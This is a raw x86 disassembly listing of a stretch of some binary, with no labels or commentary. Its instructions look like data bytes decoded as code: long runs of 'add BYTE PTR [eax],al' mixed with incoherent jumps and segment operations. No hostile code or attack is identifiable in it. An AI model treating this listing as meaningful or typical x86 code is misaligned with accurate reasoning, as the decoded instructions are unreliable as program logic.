  404f29:	add    BYTE PTR [ecx],al
  404f2b:	and    BYTE PTR [edx+eiz*1],al
  404f2e:	add    BYTE PTR [eax-0x7f2bffbc],cl
  404f34:	adc    al,0x52
  404f36:	test   al,0x18
  404f38:	add    eax,0x21001420
  404f3d:	add    BYTE PTR [eax],0x24
  404f40:	add    BYTE PTR [eax+0x2030c800],al
  404f46:	adc    al,0x24
  404f48:	and    BYTE PTR [ecx],0x22
  404f4b:	and    BYTE PTR [eax+ecx*2+0x0],al
  404f4f:	inc    ebx
  404f50:	or     BYTE PTR [ecx*1+0x30158c01],al
  404f57:	and    BYTE PTR [eax-0x2bd7bbe0],al
  404f5d:	and    DWORD PTR [ebx],eax
  404f5f:	add    al,BYTE PTR [eax]
  404f61:	add    BYTE PTR [edx+0x7d000001],al
  404f67:	pop    esp
  404f68:	add    BYTE PTR [eax+0x4a],cl
  404f6b:	add    BYTE PTR [edx],al
  404f6d:	add    ah,BYTE PTR [eax]
  404f6f:	add    BYTE PTR [eax],bl
  404f71:	and    eax,0xb14a002
  404f76:	adc    BYTE PTR [eax+0xe8c9],0x1
  404f7d:	add    BYTE PTR [eax+0x1a],al
  404f80:	add    BYTE PTR [edx+0x20000000],0x1
  404f87:	dec    ecx
  404f88:	or     DWORD PTR [edi],eax
  404f8a:	add    al,0x86
  404f8c:	and    BYTE PTR [ecx],al
  404f8e:	sub    al,BYTE PTR [ebx+eiz*1]
  404f91:	add    dl,BYTE PTR [ecx+0x35]
  404f94:	or     BYTE PTR ds:0x8200940c,ah
  404f9a:	adc    al,BYTE PTR [eax]
  404f9c:	add    dh,0x40
  404f9f:	mov    BYTE PTR [eax],cl
  404fa1:	and    BYTE PTR [eax+0x70],cl
  404fa4:	or     al,BYTE PTR [eax]
  404fa6:	adc    eax,DWORD PTR [eax]
  404fa8:	and    al,BYTE PTR [eax]
  404faa:	or     BYTE PTR [eax+0x110000],dl
  404fb0:	inc    eax
  404fb1:	add    BYTE PTR [eax+eax*1],al
  404fb4:	add    al,0x0
  404fb6:	and    cl,al
  404fb8:	add    BYTE PTR [eax+0x21840],bl
  404fbe:	or     ch,BYTE PTR [eax]
  404fc0:	push   eax
  404fc1:	add    BYTE PTR [ecx],ah
  404fc3:	add    cl,BYTE PTR [eax]
  404fc5:	test   DWORD PTR [esi+0x5d802801],edi
  404fcb:	and    DWORD PTR [eax+eax*2],ecx
  404fce:	add    DWORD PTR [eax+0x40338801],eax
  404fd4:	push   cs
  404fd5:	push   edx
  404fd6:	add    eax,0x80854001
  404fdb:	adc    BYTE PTR [eax-0x80],ah
  404fde:	add    BYTE PTR [eax],al
  404fe0:	add    BYTE PTR [eax+0x0],ch
  404fe3:	add    dl,BYTE PTR [eax]
  404fe5:	mov    DWORD PTR [ebx],ecx
  404fe7:	push   eax
  404fe8:	add    al,0x0
  404fea:	add    al,BYTE PTR ds:0x489018
  404ff0:	pop    ebp
  404ff1:	adc    BYTE PTR [ecx+eax*1],0x40
  404ff5:	inc    esi
  404ff6:	add    DWORD PTR [eax+eiz*2],ecx
  404ff9:	xchg   ebp,eax
  404ffa:	inc    esp
  404ffb:	add    BYTE PTR [eax],0x8
  404ffe:	xor    DWORD PTR [edi+ecx*1-0x663f3e00],ecx
  405005:	add    BYTE PTR [eax],cl
  405007:	das    
  405008:	adc    BYTE PTR [eax+0x0],ah
  40500b:	pop    eax
  40500c:	and    eax,0x290c9041
  405011:	adc    DWORD PTR [eax+0x38408400],ecx
  405017:	add    BYTE PTR ss:[eax],al
  40501a:	and    BYTE PTR [edi+0x11804108],dl
  405020:	and    BYTE PTR [eax],al
  405022:	add    BYTE PTR [eax+eax*4],ah
  405025:	add    BYTE PTR [ecx],0x98
  405028:	dec    eax
  405029:	add    BYTE PTR [edx],dl
  40502b:	add    al,al
  40502d:	or     BYTE PTR es:[eax],ah
  405030:	add    BYTE PTR [eax+0x18000000],0xa
  405037:	cwde   
  405038:	add    BYTE PTR [edx],al
  40503a:	rol    BYTE PTR [eax],0x0
  40503d:	add    al,BYTE PTR [eax]
  40503f:	test   BYTE PTR [eax+0x8],al
  405042:	js     0x48504d
  405048:	add    BYTE PTR [eax],cl
  40504a:	add    al,0x2
  40504c:	add    DWORD PTR [eax],ecx
  40504e:	test   DWORD PTR [eax],eax
  405050:	mov    ah,0xa2
  405052:	inc    eax
  405053:	add    BYTE PTR [eax],cl
  405055:	inc    eax
  405056:	add    BYTE PTR [eax+0xe203212],cl
  40505c:	adc    BYTE PTR [ecx],dl
  40505e:	add    BYTE PTR [eax],al
  405060:	and    cl,al
  405062:	add    BYTE PTR [eax],dl
  405064:	add    BYTE PTR [eax],al
  405066:	or     BYTE PTR [eax],al
  405068:	and    BYTE PTR [eax],al
  40506a:	add    ah,BYTE PTR [eax+0x1]
  40506d:	push   esp
  40506e:	mov    al,ds:0x82a41018
  405073:	mov    BYTE PTR [ecx+0x3800500a],al
  405079:	ret    0xa3c0
  40507c:	inc    esi
  40507d:	test   BYTE PTR [eax],al
  40507f:	or     DWORD PTR ds:0x4240919f,ecx
  405085:	add    al,BYTE PTR [esi]
  405087:	add    dl,BYTE PTR [eax-0x7e]
  40508a:	or     DWORD PTR [eax+0x10],edx
  40508d:	add    BYTE PTR [eax],al
  40508f:	push   es
  405090:	add    cl,BYTE PTR [ecx]
  405092:	add    BYTE PTR [edx],dh
  405094:	add    BYTE PTR [ecx+0x0],cl
  405097:	adc    al,0x0
  405099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40509a:	add    cl,BYTE PTR ds:0x2948800
  4050a0:	add    al,0x9
  4050a2:	add    al,0x6
  4050a4:	inc    edx
  4050a5:	xchg   ebx,eax
  4050a6:	sbb    BYTE PTR [ecx],al
  4050a8:	add    BYTE PTR [ebp+0x1100000],al
  4050ae:	and    dh,BYTE PTR [ecx]
  4050b0:	mov    al,ds:0x3008100
  4050b5:	adc    ah,BYTE PTR [eax]
  4050b7:	mov    ds:0x8123800,al
  4050bc:	lods   al,BYTE PTR ds:[esi]
  4050bd:	mov    al,ds:0x2200108
  4050c2:	mov    bh,0x1
  4050c4:	and    al,0x46
  4050c6:	nop
  4050c7:	mov    BYTE PTR [edx],al
  4050c9:	add    BYTE PTR [eax-0x71],al
  4050cc:	dec    esp
  4050cd:	inc    ebp
  4050ce:	add    BYTE PTR [edx],al
  4050d0:	add    BYTE PTR [eax],al
  4050d2:	mov    DWORD PTR [eax+0x0],esp
  4050d5:	push   eax
  4050d6:	add    al,BYTE PTR [eax]
  4050d8:	test   BYTE PTR [ebx],dl
  4050da:	push   esp
  4050db:	add    ch,BYTE PTR [esi]
  4050dd:	add    cl,al
  4050df:	add    eax,DWORD PTR [eax]
  4050e1:	and    al,dh
  4050e3:	adc    edi,DWORD PTR [eax]
  4050e5:	add    BYTE PTR [eax+ecx*2],dl
  4050e8:	add    al,0x40
  4050ea:	and    DWORD PTR [ebx],esp
  4050ec:	add    BYTE PTR [esi],al
  4050ee:	inc    edx
  4050ef:	adc    eax,DWORD PTR [edx+0x60]
  4050f2:	add    DWORD PTR [eax],ecx
  4050f4:	adc    cl,BYTE PTR [eax+0x0]
  4050f7:	or     BYTE PTR [edx],dl
  4050f9:	add    BYTE PTR [eax],al
  4050fb:	add    BYTE PTR [eax],al
  4050fd:	push   eax
  4050fe:	shl    BYTE PTR [edx],1
  405100:	sbb    BYTE PTR [ebx],0x40
  405103:	add    BYTE PTR [eax],al
  405105:	xchg   ecx,eax
  405106:	mov    BYTE PTR [ecx],ah
  405108:	adc    BYTE PTR [eax+0x40080960],dl
  40510e:	add    al,BYTE PTR [eax+edx*4]
  405111:	or     BYTE PTR [eax],0x40
  405114:	add    DWORD PTR [ecx],eax
  405116:	push   eax
  405117:	adc    BYTE PTR [eax],al
  405119:	pop    eax
  40511a:	and    al,BYTE PTR [edx-0x3a]
  40511d:	adc    al,BYTE PTR [ecx-0x5fbeffbe]
  405123:	add    BYTE PTR [eax],al
  405125:	push   esp
  405126:	jo     0x4050f2
  405128:	or     DWORD PTR [eax+0x8800190],eax
  40512e:	inc    esi
  40512f:	xchg   edx,eax
  405130:	jo     0x405132
  405132:	push   es
  405133:	add    al,BYTE PTR [ebp+0x22420501]
  405139:	or     al,0x8
  40513b:	adc    BYTE PTR [ecx+0x24088003],al
  405141:	adc    al,al
  405143:	and    ah,cl
  405145:	add    BYTE PTR [ecx+0x0],al
  405148:	or     DWORD PTR [esi+0x29b38],esp
  40514e:	add    al,0x0
  405150:	test   al,0x1
  405152:	mov    eax,0x26649000
  405157:	arpl   WORD PTR [eax+0x246b12],ax
  40515d:	add    eax,eax
  40515f:	add    al,0x0
  405161:	ret    0x4012
  405164:	adc    al,0xa1
  405166:	adc    BYTE PTR [esp+ebp*1],al
  405169:	sub    BYTE PTR [eax+0x1020e604],al
  40516f:	ins    BYTE PTR es:[edi],dx
  405170:	push   eax
  405171:	add    BYTE PTR [eax+0x210450],al
  405177:	add    DWORD PTR [ecx],eax
  405179:	and    BYTE PTR [ebp+0x54],al
  40517c:	or     BYTE PTR [eax],al
  40517e:	inc    eax
  40517f:	dec    eax
  405180:	sbb    DWORD PTR [eax],eax
  405182:	add    al,0x10
  405184:	inc    eax
  405185:	jns    0x4051bb
  405187:	push   edx
  405188:	add    BYTE PTR [eax],al
  40518a:	inc    eax
  40518b:	add    BYTE PTR [ecx],al
  40518d:	or     dl,BYTE PTR [ecx*1-0x5ffa9f38]
  405194:	adc    BYTE PTR [eax],dl
  405196:	or     DWORD PTR [eax+0x76a0800],0x44
  40519d:	add    BYTE PTR [eax+eax*1+0x8],al
  4051a1:	add    DWORD PTR [edx],eax
  4051a3:	add    BYTE PTR [eax],al
  4051a5:	sbb    BYTE PTR [eax],cl
  4051a7:	inc    eax
  4051a8:	add    DWORD PTR [edx],0x80400484
  4051ae:	add    cl,ah
  4051b0:	lods   al,BYTE PTR ds:[esi]
  4051b1:	sub    BYTE PTR [eax+0x8],al
  4051b4:	add    DWORD PTR [eax+0x0],eax
  4051b7:	add    BYTE PTR [eax],al
  4051b9:	add    al,BYTE PTR [esp+eax*1]
  4051bc:	add    dl,BYTE PTR [eax-0x38]
  4051bf:	and    al,BYTE PTR [edx]
  4051c1:	add    DWORD PTR [ecx],eax
  4051c3:	add    BYTE PTR [eax],al
  4051c5:	inc    ecx
  4051c6:	inc    eax
  4051c7:	and    eax,0x2280008
  4051cc:	add    BYTE PTR [eax],0x89
  4051cf:	bound  eax,QWORD PTR [eax]
  4051d1:	add    al,0x20
  4051d3:	add    BYTE PTR [edx+0x2c],al
  4051d6:	add    BYTE PTR [edx+0x20],dl
  4051d9:	and    BYTE PTR [eax],dl
  4051db:	or     BYTE PTR [eax-0x80],al
  4051de:	mov    edx,DWORD PTR [ecx-0x7f7ff9a0]
  4051e4:	mov    al,ds:0x4200052
  4051e9:	test   BYTE PTR [edx],al
  4051eb:	add    al,ah
  4051ed:	or     al,0x40
  4051ef:	sbb    dh,BYTE PTR [eax+0x0]
  4051f2:	add    BYTE PTR [eax+0x24a03],dh
  4051f8:	add    BYTE PTR [eax],al
  4051fa:	and    BYTE PTR [eax],cl
  4051fc:	mov    BYTE PTR [eax],al
  4051fe:	add    BYTE PTR [eax],al
  405200:	and    al,0x0
  405202:	add    DWORD PTR [eax],eax
  405204:	add    BYTE PTR [edx],al
  405206:	inc    eax
  405207:	add    BYTE PTR [eax],al
  405209:	and    BYTE PTR [eax],dl
  40520b:	add    al,al
  40520d:	sbb    BYTE PTR [eax+0x14],al
  405210:	add    BYTE PTR [eax+0x4],dl
  405213:	les    eax,FWORD PTR [eax]
  405215:	adc    BYTE PTR [eax+eax*1+0x1800200],dl
  40521c:	or     al,0x1d
  40521e:	and    al,0x1
  405220:	add    BYTE PTR [eax+0x800419],al
  405226:	popa   
  405227:	add    BYTE PTR [eax],al
  405229:	cmp    BYTE PTR [eax],cl
  40522b:	push   ss
  40522c:	and    BYTE PTR [edx],ah
  40522e:	or     BYTE PTR [ecx],0x0
  405231:	pusha  
  405232:	inc    eax
  405233:	and    BYTE PTR [eax],dl
  405235:	les    esi,FWORD PTR [eax+eax*2-0x54]
  405239:	add    DWORD PTR [ecx+0x39],ecx
  40523c:	inc    eax
  40523d:	adc    BYTE PTR [edi],al
  40523f:	dec    esp
  405240:	add    BYTE PTR [eax],ah
  405242:	and    BYTE PTR [eax+0x10802020],cl
  405248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405249:	mov    es,WORD PTR [eax]
  40524b:	add    BYTE PTR [eax],al
  40524d:	add    al,0x0
  40524f:	add    BYTE PTR [eax-0x7df7df70],al
  405255:	and    BYTE PTR [eax],ah
  405257:	pop    esp
  405258:	add    eax,DWORD PTR [ebx+esi*2+0x3109821a]
  40525f:	mov    edx,DWORD PTR [eax+0x0]
  405262:	and    BYTE PTR [eax],0x70
  405265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405266:	adc    BYTE PTR [esi],al
  405268:	add    BYTE PTR [ecx+ecx*1],al
  40526b:	and    BYTE PTR [eax],al
  40526d:	and    esp,eax
  40526f:	and    BYTE PTR [eax],al
  405271:	inc    esp
  405272:	or     BYTE PTR [eax],al
  405274:	and    BYTE PTR [ecx],al
  405276:	inc    eax
  405277:	or     DWORD PTR [eax],edx
  405279:	jno    0x4052c3
  40527b:	add    BYTE PTR [ecx],0x20
  40527e:	add    BYTE PTR [eax],al
  405280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405281:	and    ch,ah
  405283:	add    BYTE PTR [eax],al
  405285:	fs add al,0x1
  405288:	loop   0x40528e
  40528a:	add    BYTE PTR [eax],al
  40528c:	add    DWORD PTR [eax+0x4],eax
  40528f:	and    ah,BYTE PTR [eax+eax*1]
  405292:	pusha  
  405293:	or     ax,cx
  405296:	add    BYTE PTR [edx+0x22],cl
  405299:	dec    esi
  40529a:	add    BYTE PTR [ecx],0x0
  40529d:	or     BYTE PTR [ecx+0x1],al
  4052a0:	pusha  
  4052a1:	add    dl,BYTE PTR [eax+0x0]
  4052a4:	pop    eax
  4052a5:	sbb    BYTE PTR [eax-0x6e],al
  4052a8:	and    BYTE PTR [eax],dl
  4052aa:	sbb    DWORD PTR [ecx],0x2886530
  4052b0:	add    BYTE PTR [edx],0x10
  4052b3:	mov    al,BYTE PTR [eax]
  4052b5:	dec    edx
  4052b6:	xchg   edx,eax
  4052b7:	push   es
  4052b8:	inc    ecx
  4052b9:	or     DWORD PTR [eax],0x4a
  4052bc:	or     BYTE PTR [ecx],al
  4052be:	inc    eax
  4052bf:	push   esp
  4052c0:	inc    eax
  4052c1:	add    BYTE PTR [ebx],al
  4052c3:	add    ah,BYTE PTR [eax]
  4052c5:	and    BYTE PTR [eax+eax*1],cl
  4052c8:	add    BYTE PTR [esi+0x1],al
  4052cb:	add    DWORD PTR [eax+0x11],edx
  4052ce:	cmp    dh,0x0
  4052d1:	cmp    BYTE PTR [edx],al
  4052d3:	and    DWORD PTR [esp+eax*1],0x42021a
  4052da:	mov    BYTE PTR [eax],dl
  4052dc:	add    BYTE PTR [ebx],al
  4052de:	nop
  4052df:	inc    eax
  4052e0:	add    cl,BYTE PTR [ecx+edx*1]
  4052e3:	add    DWORD PTR [ecx+eax*1],ecx
  4052e6:	add    BYTE PTR [eax],cl
  4052e8:	add    BYTE PTR [edx-0x73],dl
  4052eb:	add    bh,BYTE PTR [esi+0x0]
  4052ee:	and    BYTE PTR [eax+0x4],al
  4052f1:	add    al,0xb4
  4052f3:	add    BYTE PTR [eax],al
  4052f5:	test   BYTE PTR [eax+0x2004005],cl
  4052fb:	pusha  
  4052fc:	sub    BYTE PTR [ecx+edx*1],ah
  4052ff:	add    DWORD PTR [eax+eax*1],ecx
  405302:	add    BYTE PTR [esp+eax*8],al
  405305:	dec    ebp
  405306:	add    BYTE PTR [ebx],0x39
  405309:	and    BYTE PTR [eax+0x0],ch
  40530c:	rol    BYTE PTR ds:0xd0298001,0x52
  405313:	inc    edx
  405314:	add    BYTE PTR [eax],cl
  405316:	add    al,BYTE PTR [eax]
  405318:	dec    esp
  405319:	add    al,0x0
  40531b:	mov    BYTE PTR [eax],al
  40531d:	dec    eax
  40531e:	add    BYTE PTR [eax],dl
  405320:	and    DWORD PTR [esp+ecx*8],0x56101820
  405327:	add    BYTE PTR [edx],al
  405329:	add    BYTE PTR [edx-0x4f],al
  40532c:	dec    ecx
  40532d:	inc    eax
  40532e:	fs popa 
  405330:	add    BYTE PTR [eax+0x10002048],ah
  405336:	inc    eax
  405337:	loop   0x405339
  405339:	add    BYTE PTR [eax+0x60],dh
  40533c:	or     ah,al
  40533e:	add    BYTE PTR [eax+0x18e1800],al
  405344:	adc    BYTE PTR [esi+0x6],cl
  405347:	inc    esp
  405348:	xor    DWORD PTR [ecx-0x70],eax
  40534b:	add    al,BYTE PTR [ecx+0x0]
  40534e:	sbb    al,BYTE PTR [ecx]
  405350:	add    BYTE PTR [eax+0x20408002],cl
  405356:	add    BYTE PTR [eax],al
  405358:	add    BYTE PTR [eax],cl
  40535a:	cwde   
  40535b:	inc    esp
  40535c:	sbb    BYTE PTR [ecx+0x50015050],al
  405362:	rol    DWORD PTR [esi],0x50
  405365:	adc    DWORD PTR [eax],eax
  405367:	push   esp
  405368:	add    al,cl
  40536a:	call   0x1c05b97
  40536f:	add    BYTE PTR [ebp+0x0],al
  405372:	add    DWORD PTR [eax+0x9],ebx
  405375:	and    BYTE PTR [eax],cl
  405377:	nop
  405378:	or     DWORD PTR [eax],eax
  40537a:	add    al,BYTE PTR [eax]
  40537c:	add    al,bl
  40537e:	cmp    BYTE PTR [edx],al
  405380:	adc    al,al
  405382:	or     BYTE PTR [ebx+0x10800200],al
  405388:	or     BYTE PTR [edx+0x407e0180],dl
  40538e:	nop
  40538f:	mov    al,ds:0xa2002321
  405394:	xor    BYTE PTR [eax+eax*4-0x70],al
  405398:	inc    edx
  405399:	je     0x40532b
  40539b:	inc    eax
  40539c:	or     BYTE PTR [eax],al
  40539e:	rol    BYTE PTR ds:0x18805300,1
  4053a4:	add    BYTE PTR [eax],al
  4053a6:	sbb    al,BYTE PTR [esp+ecx*1+0x10]
  4053aa:	dec    ebp
  4053ab:	rol    BYTE PTR [ecx+0x2],0x84
  4053af:	add    al,0x20
  4053b1:	add    BYTE PTR [eax+0x0],al
  4053b4:	or     al,BYTE PTR [esi+0x17054010]
  4053ba:	add    eax,eax
  4053bc:	sub    eax,0x8818
  4053c1:	add    BYTE PTR [eax],al
  4053c3:	add    BYTE PTR [ecx+0x40],cl
  4053c6:	xchg   esp,eax
  4053c7:	add    al,0x10
  4053c9:	push   esp
  4053ca:	add    al,BYTE PTR [esi]
  4053cc:	or     BYTE PTR [eax],al
  4053ce:	add    BYTE PTR [ebx],al
  4053d0:	inc    esp
  4053d1:	inc    eax
  4053d2:	add    BYTE PTR [eax+esi*4],dh
  4053d5:	mov    edx,DWORD PTR [ecx]
  4053d7:	push   eax
  4053d8:	add    eax,DWORD PTR [eax+0x41]
  4053db:	rol    BYTE PTR [eax],0x6
  4053de:	adc    al,0x48
  4053e0:	inc    esp
  4053e1:	or     cl,BYTE PTR [ecx]
  4053e3:	add    al,0x80
  4053e5:	test   BYTE PTR [edx],al
  4053e7:	add    al,BYTE PTR [eax]
  4053e9:	and    BYTE PTR [eax+0x43050b80],al
  4053ef:	add    BYTE PTR [eax],al
  4053f1:	adc    BYTE PTR [eax+0x31054],dl
  4053f7:	add    al,0x89
  4053f9:	ins    BYTE PTR es:[edi],dx
  4053fa:	add    DWORD PTR [eax],ecx
  4053fc:	rol    BYTE PTR [eax],0x9a
  4053ff:	add    DWORD PTR [eax],eax
  405401:	adc    DWORD PTR [ecx-0x80],0x5c
  405405:	or     al,0x48
  405407:	inc    eax
  405408:	or     al,0x84
  40540a:	and    BYTE PTR [eax],0x0
  40540d:	dec    eax
  40540e:	add    DWORD PTR [eax+eax*1+0x50],eax
  405412:	mov    ebx,0x2000000
  405417:	xor    BYTE PTR [eax+0x8],cl
  40541a:	sub    DWORD PTR [eax],ebp
  40541c:	push   ss
  40541d:	add    BYTE PTR [eax],al
  40541f:	xor    DWORD PTR [edx],esi
  405421:	add    ah,0x59
  405424:	add    BYTE PTR [edx],al
  405426:	inc    eax
  405427:	test   BYTE PTR [eax],ch
  405429:	rcl    BYTE PTR [eax],1
  40542b:	add    BYTE PTR [eax],cl
  40542d:	add    ah,cl
  40542f:	mov    al,ds:0x8800
  405434:	inc    esp
  405435:	pusha  
  405436:	add    eax,0x60000844
  40543b:	inc    eax
  40543c:	add    BYTE PTR [eax],ah
  40543e:	adc    BYTE PTR [ebp+0xc680408],dh
  405444:	inc    eax
  405445:	inc    ebx
  405446:	add    al,BYTE PTR [eax]
  405448:	add    bl,BYTE PTR [edx]
  40544a:	add    BYTE PTR [eax+0x60],dl
  40544d:	add    al,BYTE PTR [eax]
  40544f:	test   DWORD PTR [ecx+eax*1],ecx
  405452:	or     al,0x19
  405454:	add    al,0x4
  405456:	add    BYTE PTR es:[eax+0xa],ah
  40545a:	add    dl,BYTE PTR [eax]
  40545c:	add    cl,BYTE PTR [edx]
  40545e:	add    BYTE PTR [eax],al
  405460:	push   es
  405461:	mov    eax,ds:0x28000000
  405466:	or     BYTE PTR fs:[eax],al
  405469:	and    BYTE PTR fs:[ecx],ah
  40546c:	loopne 0x4054c0
  40546e:	adc    BYTE PTR [ebx],cl
  405470:	inc    ecx
  405471:	add    BYTE PTR [eax],cl
  405473:	or     eax,0x6410f4b3
  405478:	xchg   DWORD PTR [eax],eax
  40547a:	retf   
  40547b:	or     BYTE PTR [edx+0x20],al
  40547e:	add    BYTE PTR [eax+0x3080404],dh
  405484:	add    BYTE PTR ds:0x8a530420,ah
  40548a:	add    BYTE PTR [eax+0x43],al
  40548d:	inc    eax
  40548e:	add    BYTE PTR [edx],cl
  405490:	and    DWORD PTR [ecx+0x8e25041],eax
  405496:	and    DWORD PTR [eax],eax
  405498:	push   es
  405499:	or     BYTE PTR [edx+0xa600c],0x0
  4054a0:	inc    esp
  4054a1:	mov    eax,ds:0x124040cc
  4054a6:	adc    eax,0x290100
  4054ab:	and    BYTE PTR [eax+ebx*1],bl
  4054ae:	or     al,0x10
  4054b0:	add    dh,BYTE PTR [ecx]
  4054b2:	sub    BYTE PTR [eax],cl
  4054b4:	and    eax,0x60400000
  4054b9:	add    al,BYTE PTR [eax+0x0]
  4054bc:	adc    cl,ah
  4054be:	adc    eax,0x3cd88190
  4054c3:	inc    ecx
  4054c4:	mov    DWORD PTR [eax],esp
  4054c6:	add    BYTE PTR es:[eax],al
  4054c9:	add    al,0x1
  4054cb:	add    al,0x0
  4054cd:	jmp    0x8005:0x6028e0
  4054d4:	add    BYTE PTR [edx+0x1008034],al
  4054da:	sbb    BYTE PTR [edx+0x0],bl
  4054dd:	inc    eax
  4054de:	or     BYTE PTR [eax],al
  4054e0:	add    BYTE PTR [edx+0x500044b6],al
  4054e6:	inc    eax
  4054e7:	add    BYTE PTR [edx+0xa00004],al
  4054ed:	add    al,BYTE PTR [eax+0x0]
  4054f0:	and    al,0x2
  4054f2:	mov    al,ds:0x40031800
  4054f7:	inc    esp
  4054f8:	or     ah,BYTE PTR [eax+0x10952080]
  4054fe:	add    BYTE PTR [edx],ah
  405500:	xchg   edi,eax
  405501:	mov    eax,0x40d0541
  405506:	add    DWORD PTR [eax+0x10],esp
  405509:	hlt    
  40550a:	inc    eax
  40550b:	xchg   ecx,eax
  40550c:	add    BYTE PTR [eax+0x7],al
  40550f:	add    BYTE PTR [eax],cl
  405511:	add    al,BYTE PTR [ecx]
  405513:	or     BYTE PTR [eax],al
  405515:	and    BYTE PTR [eax-0x5e],al
  405518:	add    esp,DWORD PTR [eax]
  40551a:	add    BYTE PTR [eax+ebp*1+0x40],dl
  40551e:	or     BYTE PTR [edx+0xb00004],dl
  405524:	rol    BYTE PTR [ebx],0x0
  405527:	or     BYTE PTR [ecx],dl
  405529:	and    BYTE PTR [eax-0x7f],al
  40552c:	add    BYTE PTR [eax+0x10],al
  40552f:	adc    DWORD PTR [eax],eax
  405531:	inc    ecx
  405532:	add    BYTE PTR [ecx],dl
  405534:	add    BYTE PTR [eax],0x1d
  405537:	cwde   
  405538:	aam    0x0
  40553a:	sbb    BYTE PTR [eax],cl
  40553c:	add    BYTE PTR [eax],al
  40553e:	add    BYTE PTR [eax+0x42],al
  405541:	test   BYTE PTR [eax+0x10],ah
  405544:	pop    esp
  405545:	or     DWORD PTR [edx],eax
  405547:	add    dl,BYTE PTR [edx+0x28]
  40554a:	dec    eax
  40554b:	sbb    BYTE PTR [eax+0x13484c06],al
  405551:	ret    0x406
  405554:	pusha  
  405555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405556:	add    BYTE PTR [eax],al
  405558:	add    BYTE PTR [ecx],al
  40555a:	mov    bh,BYTE PTR [eax]
  40555c:	and    BYTE PTR [ecx],al
  40555e:	adc    eax,eax
  405560:	add    al,BYTE PTR [ecx]
  405562:	test   BYTE PTR [esi+0xa],bl
  405565:	inc    eax
  405566:	or     dl,cl
  405568:	add    al,BYTE PTR [edx]
  40556a:	add    DWORD PTR [edx+0x0],0xa92820c9
  405571:	sbb    DWORD PTR [edx],edx
  405573:	xor    al,0x0
  405575:	sub    BYTE PTR [edx],al
  405577:	add    DWORD PTR [eax],eax
  405579:	adc    BYTE PTR [eax+eax*1],dl
  40557c:	adc    al,0x0
  40557e:	add    BYTE PTR [eax+0x40899551],cl
  405584:	or     BYTE PTR [eax],al
  405586:	inc    eax
  405587:	and    BYTE PTR [eax],al
  405589:	add    BYTE PTR [ecx-0x1e],al
  40558c:	add    BYTE PTR [eax],0x3e
  40558f:	add    BYTE PTR [eax],0x41
  405592:	add    BYTE PTR [eax],dl
  405594:	add    al,0x2
  405596:	sbb    al,0xab
  405598:	and    al,0x0
  40559a:	rol    BYTE PTR [edx+eax*1],0x92
  40559e:	or     al,cl
  4055a0:	add    BYTE PTR [esp+ecx*1],ah
  4055a3:	bound  edx,QWORD PTR [esi]
  4055a5:	inc    eax
  4055a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055a7:	push   cs
  4055a8:	push   0xe080000
  4055ad:	add    al,0x90
  4055af:	add    BYTE PTR [edx],0x10
  4055b2:	add    al,BYTE PTR [eax]
  4055b4:	add    al,0x4
  4055b6:	add    al,0x88
  4055b8:	or     eax,0x20000c40
  4055bd:	add    BYTE PTR [eax],al
  4055bf:	inc    esp
  4055c0:	add    BYTE PTR [edi+0x4],dh
  4055c3:	add    BYTE PTR [eax+eax*2],cl
  4055c6:	add    BYTE PTR [eax+eax*8],al
  4055c9:	push   es
  4055ca:	inc    edx
  4055cb:	add    BYTE PTR [eax+0x58],0x89
  4055cf:	or     BYTE PTR [edx+0x40],0x2c
  4055d3:	pop    es
  4055d4:	add    eax,DWORD PTR [ecx]
  4055d6:	sub    BYTE PTR [eax+0x10a20210],bl
  4055dc:	add    DWORD PTR [edx+0x51],eax
  4055df:	add    al,0x92
  4055e1:	add    BYTE PTR [eax],bl
  4055e3:	rol    BYTE PTR [eax+0x6],0x28
  4055e7:	mov    BYTE PTR [eax+0x2011a040],al
  4055ed:	add    BYTE PTR [ecx+0x400c061],al
  4055f3:	inc    edx
  4055f4:	add    BYTE PTR [eax+eax*1],dl
  4055f7:	add    BYTE PTR [eax-0x457cded8],al
  4055fd:	add    al,0x42
  4055ff:	add    BYTE PTR [edx],al
  405601:	add    BYTE PTR [eax],ah
  405603:	xchg   esp,eax
  405604:	or     BYTE PTR [eax-0x18],cl
  405607:	inc    eax
  405608:	dec    eax
  405609:	inc    eax
  40560a:	or     al,0x20
  40560c:	add    BYTE PTR [eax+0x4140c40],0x0
  405613:	add    ah,BYTE PTR [ebx+eiz*4+0x14884489]
  40561a:	add    BYTE PTR [eax-0x66],al
  40561d:	add    BYTE PTR [ebp+0x50920010],0x10
  405624:	add    al,BYTE PTR [eax]
  405626:	add    BYTE PTR [eax],dl
  405628:	add    BYTE PTR [eax+eax*2+0xa8a001],al
  40562f:	sbb    DWORD PTR [edx],ecx
  405631:	nop
  405632:	add    BYTE PTR [eax],al
  405634:	adc    BYTE PTR [edx+0x3],dl
  405637:	mov    WORD PTR [eax],es
  405639:	lock dec ecx
  40563b:	mov    al,ds:0x420b2010
  405640:	sbb    DWORD PTR [ecx*1+0x2014461],0x401010a8
  40564b:	add    BYTE PTR [eax+edx*1],bl
  40564e:	adc    BYTE PTR [eax+0xa000c05],ah
  405654:	add    BYTE PTR [edx-0x50],al
  405657:	or     dh,BYTE PTR [edx]
  405659:	add    DWORD PTR [eax],edx
  40565b:	mov    BYTE PTR [esi],al
  40565d:	and    al,0x0
  40565f:	adc    BYTE PTR [edx],ah
  405661:	add    cl,0x7
  405664:	add    BYTE PTR [esp+edx*2-0x7ff77ffe],dl
  40566b:	and    ah,BYTE PTR [eax+0x438a]
  405671:	add    BYTE PTR [eax],ah
  405673:	adc    DWORD PTR [eax],eax
  405675:	xor    DWORD PTR cs:[eax],0x4228803c
  40567c:	adc    eax,0x80256210
  405681:	add    BYTE PTR [ecx],ah
  405683:	and    BYTE PTR [esp+esi*1],ah
  405686:	add    BYTE PTR [ecx+0x42a4044],dl
  40568c:	pop    esp
  40568d:	add    al,0x80
  40568f:	or     BYTE PTR [eax],al
  405691:	mov    ecx,0x80c004
  405696:	and    BYTE PTR [eax+0x29],cl
  405699:	add    al,0x9
  40569b:	add    BYTE PTR [eax+0x1],dl
  40569e:	add    dl,BYTE PTR [eax]
  4056a0:	add    BYTE PTR [eax],dl
  4056a2:	add    BYTE PTR [eax],al
  4056a4:	enter  0xc09b,0x3
  4056a8:	xor    BYTE PTR [eax],ah
